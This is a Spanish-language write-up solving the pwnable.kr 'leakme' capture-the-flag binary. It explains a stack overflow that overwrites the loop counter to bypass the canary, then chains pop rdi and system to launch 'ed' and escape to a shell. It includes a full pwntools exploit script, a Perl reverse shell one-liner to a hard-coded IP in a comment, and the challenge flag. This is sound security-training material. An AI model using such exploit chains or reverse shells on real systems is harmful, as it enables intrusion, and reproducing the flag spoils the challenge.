# leakme

<img width="274" height="359" alt="leakme" src="https://github.com/user-attachments/assets/175c22fc-85aa-45a2-a86c-a978ab41c3e7" />

```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

## PC control
El programa usa `glibc-2.23`, lo patcheé con un binario de esta version que me encontré en el repositorio de how2heap.

```C
undefined8 menu1(void)

{
  char *chunk;
  
  puts("give me bytes");
  chunk = (char *)malloc(200);
  fgets(chunk,150,stdin);
  puts("info leak with uninitialized bytes?");
  fwrite(chunk,4,1,stdout);
  free(chunk);
  return 0;
}
```

```C
undefined8 menu3(void)

{
  char *chunk;
  long in_FS_OFFSET;
  char buf [92];
  int i;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  memset(buf,0,100);
  puts("you may start stack BOF but...");
  puts("no memory leak from now!");
  close(1);
  close(2);
  chunk = (char *)malloc(100);
  fgets(chunk,116,stdin);
  for (; i < 200; i = i + 1) {
    buf[i] = chunk[i];
  }
  stdin = (FILE *)0xdeadbeef;
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return * /
    __stack_chk_fail();
  }
  return 0;
}
```

Aqui tenemos un buffer overflow. Escribe 200 bytes a partir de los datos del chunk. Este chunk esta justo antes del top chunk. Esta es la tabla de correspondencia de los bytes con respecto al heap:
- bytes 1-100     `chunk.data`
- bytes 101-108   `top_chunk.prevsize`
- bytes 109-116   `top_chunk.size`
- bytes 117-200   `top_chnuk.data`

Y esta es la tabla de los bytes con respecto a la disposicion del stack frame:
- bytes 1-92      `buf`
- bytes 93-96     `i`
- bytes 97-104    `padding`
- bytes 105-112   `canary`
- bytes 113-120   `rbp`
- bytes 121-128   `rip`

Solo podemos controlar el contenido de los primeros 116 bytes, es decir, podemos escribir hasta rbp parcialmente. Pero no tenemos leaks, por lo que pivotar no parece ser posible. `menu2` solo ofrece un leak parcial, los dos bytes mas significativos de libc, no suficientes para hacer algo relevante.

No conocemos el valor del canario, sin embargo, dado que sobreescribimos la mismísima variable de conteo, podemos hacer i=119(0x77) (1 menos porque el contador lo aumenta en 1 justo despues) y así sobreescribir RIP sin tocar el canario.

Controlar `rip` es posible, porque hay un comportamiento peculiar en esta version que provoca que la entrada de `fgets` quede duplicada y se almacene no solo en el campo `data` del chunk de destion sino tambien en el campo `data` del top chunk:
```
───────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdbd8 : ▸ 0x400dc3 (main+366) ◂:  jmp main+414
01:0008│-030 0x7fffffffdbe0 ◂:  0x1ffffdc0e
02:0010│-028 0x7fffffffdbe8 : ▸ 0x603010 ◂:  0xfbad240c
03:0018│-020 0x7fffffffdbf0 : ▸ 0x400e00 (__libc_csu_init) ◂:  push r15
04:0020│-018 0x7fffffffdbf8 : ▸ 0x400940 (_start) ◂:  xor ebp, ebp
05:0028│-010 0x7fffffffdc00 : ▸ 0x7fffffffdcf0 ◂:  1
06:0030│-008 0x7fffffffdc08 ◂:  0x17f3d537f3eaf600
07:0038│ rbp 0x7fffffffdc10 : ▸ 0x400e00 (__libc_csu_init) ◂:  push r15
─────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────
 ► 0         0x400a9f menu1+120
   1         0x400dc3 main+366
   2   0x7ffff7820840 __libc_start_main+240
   3         0x40096a _start+42
───────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x603000
Size: 0x15100 (with flag bits: 0x15101)

Allocated chunk | PREV_INUSE
Addr: 0x618100
Size: 0x410 (with flag bits: 0x411)

Top chunk | PREV_INUSE
Addr: 0x618510
Size: 0xbaf0 (with flag bits: 0xbaf1)

pwndbg> search AAAABBBB
Searching for byte: b'AAAABBBB'
[heap]          0x618110 'AAAABBBB\n'
[heap]          0x618520 'AAAABBBB\n'
```

## Shell

En `menu3`:
``` C
stdin = (FILE *)0xdeadbeef;
close(1);
close(2);
```

Estado actual:
- Tenemos control del flujo de ejecución.
- El descriptor de archivo para `stdin` está roto.
- Los descriptores de archivo para `stdout` y `stderr` estan cerrados.
- Tenemos a `system` en la GOT.
- No tenemos leaks del heap.
- Tenemos un leak parcial de libc.
- El binario no tiene PIE.

Cuando hacemos `system("sh")` en un programa con los descriptores de archivo en ese estado simplemente no lo para:
```C
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

int main() {
    // no lo detiene!
    stdin = (FILE*)0xdeadbeef;
    close(1);
    close(2);
    system("sh");
    return 0;
}
```

```
$ ./a.out
exec 1>/dev/tty && exec 2>/dev/tty
cowsay hey
 _____
< hey >
 -----
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

Recordemos que `stdin` en `leakme` es un puntero al objeto `FILE_plus*` en libc llamado `_IO_2_1_stdin`. Cuando ocurre un `fork` o `clone` el proceso hijo hereda los descriptores de archivo (o sea los hereda el descriptor de archivo 0 que apunta a `_IO_2_1_stdin` y NO a `stdin` en el padre) y los "locks" de `fcntl`. Los locsk supuestamente son las referencias a un "file description", cosa que indica si un descriptor de archivo esta "abierto" o "cerrado" y que `close` modifica. La man page de fork dice:
```
 •  The  child  inherits  copies  of the parent's set of open file descriptors.  Each file descriptor in the
          child refers to the same open file description (see open(2)) as the corresponding file descriptor in the
          parent.  This means that the two file descriptors share open file status flags, file offset, and signal-
          driven I/O attributes (see the description of F_SETOWN and F_SETSIG in fcntl(2)).

       •  The child inherits copies of the parent's set of open message queue  descriptors  (see  mq_overview(7)).
          Each file descriptor in the child refers to the same open message queue description as the corresponding
          file  descriptor  in  the  parent.   This  means  that  the  two  file  descriptors share the same flags
          (mq_flags).
```

```
  The child process is an exact duplicate of the parent process except for the following points:

       •  The child has its own unique process ID, and this PID does not match the ID of  any  existing  process  group
          (setpgid(2)) or session.

       •  The child's parent process ID is the same as the parent's process ID.

       •  The child does not inherit its parent's memory locks (mlock(2), mlockall(2)).

       •  Process resource utilizations (getrusage(2)) and CPU time counters (times(2)) are reset to zero in the child.

       •  The child's set of pending signals is initially empty (sigpending(2)).

       •  The child does not inherit semaphore adjustments from its parent (semop(2)).

       •  The  child  does not inherit process-associated record locks from its parent (fcntl(2)).  (On the other hand,
          it does inherit fcntl(2) open file description locks and flock(2) locks from its parent.)
```

`exec 1>/dev/tty && exec 2>/dev/tty` reabre los descriptores `stdin` y `stdout` para que apunte directamente a la terminal. `/dev/tty` es un fichero especial que representa la terminal del proceso actual.

No tenemos la direccion de una cadena "sh" pero en el Dockerfile vemos lo siguiente: `RUN apt-get install -y ed`

El contenedor posee `ed`, un editor de texto. Hay una cadena que dice "info leak with uninitialized bytes?". Bueno, podemos tomar solo una parte y ejecutar `system("ed bytes?")`. `ed` spawnea una terminal interactiva, desde la cual podemos invocar una shell escribiendo `!/bin/sh`. Por ejemplo:
```C
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

int main() {
    // no lo detiene!
    stdin = (FILE*)0xdeadbeef;
    close(1);
    close(2);
    system("ed bytes?");
    return 0;
}
```

```
$ ./a.out
!/bin/sh
exec 1>/dev/tty && exec 2>/dev/tty
uname
Linux
```

Perfecto! Ahora solo hay un problema y es que en remoto `exec 1>/dev/tty && exec 2>/dev/tty` no funcionará (estamos conectados por un socket, muchas veces no existe un terminal asociado). 

En este caso hay que redirigir la salida estandar a otro descriptor de archivo. Una reverse shell es perfecta porque por debajo hace:
```
socket(AF_INET, ...);
connect(...);
dup2(sock, 0);
dup2(sock, 1);
dup2(sock, 2);
execve("/bin/sh", ...);
```
Y así consigue redirigir los descriptores de archivo del socket (que heredaron cerrados `stdout` y `stderr` del proceso padre) a los descriptores estandar de un nuevo proceso. Aquí no hay un fork.

## Exploit
```py
#!/usr/bin/env python3

from pwn import *
elf = ELF("./leakme_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"

domain= "pwnable.kr"
#domain = "0.0.0.0"
port = 9046

def start():
    if args.REMOTE:
        return remote(domain, port)
    else:
        return process([elf.path],stdin=PTY,stdout=PTY,stderr=PTY)
r = start()

#========= exploit here ===================
def menu1(data):
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b"bytes",data)

def menu2():
    r.sendlineafter(b">", b"2")
    r.recvuntil(b"read? ")
    line = r.recvline().strip()
    sum_val = int(line.decode(), 16)
    leak = sum_val - 99 * 0x31337
    # Leaks dword [rbp-0x14]
    r.info("Leak raw 4 bytes: " + hex(leak))
    return leak

def menu3(payload):
    r.sendlineafter(b">",b"3")
    r.sendafter(b"now!",payload)

pop_rdi_ret = 0x0000000000400e63 # : pop rdi ; ret

# Useless
libc_base = menu2() << 8*4
r.info(f"Libc (known): {hex(libc_base)}")

payload = cyclic(120)
# system("ed bytes?")
payload += p64(pop_rdi_ret) + p64(0x00400eb2)
payload += p64(0x400886) # system@plt
payload += p64(elf.sym.exit)

total = b"1\n" + payload + b"\n"
#menu1(payload)

payload = b"A"*92 + b"\x77" + b"\x00"*4

total += b"3\n" + payload + b"\n"
#menu3(payload)

#r.interactive()

print(total)
open("payload","wb").write(total)

# Local
# (cat payload; echo "\!/bin/sh\nexec 1>/dev/tty && exec 2>/dev/tty"; cat flag*) | ./leakme_patched

# Remote (reverse shell with perl and bore)
# https://github.com/ekzhang/bore
# (cat /tmp/paypay; cat) | nc 0 9046
# !perl -e 'use Socket;$i="159.223.171.199";$p=9137;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};
```

`n3veR_St0p_The_infoL3ak`

